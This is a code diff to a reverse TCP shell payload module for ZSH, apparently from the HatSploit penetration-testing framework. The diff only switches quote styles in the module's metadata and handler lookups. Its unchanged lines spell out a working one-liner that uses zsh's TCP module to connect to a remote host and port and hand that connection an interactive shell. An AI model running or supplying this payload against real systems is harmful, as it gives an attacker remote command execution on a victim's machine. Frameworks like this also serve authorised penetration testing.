@@ -8,19 +8,19 @@ from hatsploit.lib.payload import Payload
 
 class HatSploitPayload(Payload):
     details = {
-        "Name": "ZSH shell Reverse TCP",
-        "Payload": "unix/generic/zsh_reverse_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "ZSH shell reverse TCP payload.",
-        "Architecture": "generic",
-        "Platform": "unix",
-        "Rank": "high",
-        "Type": "reverse_tcp",
+        'Name': "ZSH shell Reverse TCP",
+        'Payload': "unix/generic/zsh_reverse_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "ZSH shell reverse TCP payload.",
+        'Architecture': "generic",
+        'Platform': "unix",
+        'Rank': "high",
+        'Type': "reverse_tcp",
     }
 
     def run(self):
-        remote_host = self.handler["RHOST"]
-        remote_port = self.handler["RPORT"]
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {remote_host} {remote_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
         return payload
